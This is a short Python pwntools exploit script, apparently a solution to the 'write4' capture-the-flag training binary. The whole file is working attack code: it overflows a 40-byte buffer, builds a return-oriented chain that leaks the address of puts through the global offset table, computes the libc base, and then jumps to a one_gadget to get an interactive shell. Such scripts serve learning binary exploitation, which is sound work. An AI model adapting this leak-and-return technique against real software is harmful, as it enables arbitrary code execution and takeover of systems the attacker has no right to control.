from pwn import *
target=process('./write4')
elf=ELF('./write4')
libc=elf.libc
print(target.recvuntil("already!\n> "))

payload="A"*40

poprdi=0x400893
puts_plt=0x4005d0
puts_got=0x601018
pwnme=0x4007b5
one_gadget=0xe652b

payload+=p64(poprdi)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(pwnme)
payload+=p64(0x0)

target.sendline(payload)

leak=target.recvuntil("\x0a").strip("\x0a")
libc_puts=u64(leak+"\x00"*(8-len(leak)))
libc_base=libc_puts-libc.symbols["puts"]
print(hex(libc_base))
libc_gadget=libc_base+one_gadget

payload="A"*40
payload+=p64(libc_gadget)

target.sendline(payload)
target.interactive()

